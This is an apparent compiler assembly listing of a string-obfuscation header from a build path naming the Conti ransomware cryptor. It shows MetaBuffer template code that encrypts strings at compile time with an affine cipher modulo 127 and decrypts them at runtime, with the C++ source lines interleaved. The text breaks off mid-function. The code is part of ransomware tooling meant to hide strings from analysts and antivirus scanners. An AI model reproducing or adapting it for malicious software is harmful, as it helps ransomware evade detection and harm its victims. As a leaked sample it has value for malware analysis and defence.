??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00257	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0025b	88 85 c0 00 00
	00		 mov	 BYTE PTR tv189[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00261	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00268	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0026f	5f		 pop	 rdi
  00270	5d		 pop	 rbp
  00271	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 3f	 sub	 eax, 63			; 0000003fH
  0002d	6b c0 0f	 imul	 eax, eax, 15
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 11	 imul	 eax, eax, 17
  0002d	83 c0 3f	 add	 eax, 63			; 0000003fH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
